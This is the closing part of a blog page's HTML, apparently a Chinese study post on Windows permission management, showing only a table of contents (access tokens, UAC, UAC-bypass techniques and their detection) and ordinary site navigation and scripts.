        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows"><span class="toc-number">1.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">权限管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-Token"><span class="toc-number">1.1.1.</span> <span class="toc-text">Access Token</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UserAndGroups-SID%E5%88%97%E8%A1%A8"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">UserAndGroups (SID列表)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Privileges-%E7%89%B9%E6%9D%83%E4%BD%8D%E5%9B%BE"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Privileges (特权位图)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IntegrityLevelIndex-%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A7%E5%88%AB"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">IntegrityLevelIndex (完整性级别)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrustLinkedToken%EF%BC%88%E9%93%BE%E6%8E%A5%E4%BB%A4%E7%89%8C%EF%BC%89"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">TrustLinkedToken（链接令牌）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Descriptor"><span class="toc-number">1.1.2.</span> <span class="toc-text">Security Descriptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Account-Control"><span class="toc-number">1.1.3.</span> <span class="toc-text">User Account Control</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UAC%E6%8F%90%E6%9D%83%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">UAC提权机制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E5%AE%89%E5%85%A8%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text">路径安全校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text">身份与配置校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.1.3.</span> <span class="toc-text">签名校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%AD%96%E7%95%A5%E9%99%90%E5%88%B6"><span class="toc-number">1.1.3.1.4.</span> <span class="toc-text">注册表策略限制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-UAC"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">Bypass UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81UAC%E7%99%BD%E5%90%8D%E5%8D%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.3.2.1.</span> <span class="toc-text">dll劫持UAC白名单程序</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.2.1.1.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#EQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.3.2.1.2.</span> <span class="toc-text">EQL基本语法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.2.1.3.</span> <span class="toc-text">检测方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%AF%A1%E6%94%B9pe%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91"><span class="toc-number">1.1.3.2.2.</span> <span class="toc-text">通过注册表篡改pe执行逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.3.2.2.1.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.3.2.2.2.</span> <span class="toc-text">检测方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#com%E7%BB%84%E4%BB%B6ICMLuaUtil%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.3.2.3.</span> <span class="toc-text">com组件ICMLuaUtil提权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.1.3.2.3.1.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.1.3.2.3.2.</span> <span class="toc-text">检测方法</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&text=windows 学习（六）-- 权限管理"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&is_video=false&description=windows 学习（六）-- 权限管理"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=windows 学习（六）-- 权限管理&body=Check out this article: https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&name=windows 学习（六）-- 权限管理&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&t=windows 学习（六）-- 权限管理"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025-2026
    Exploooosion
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
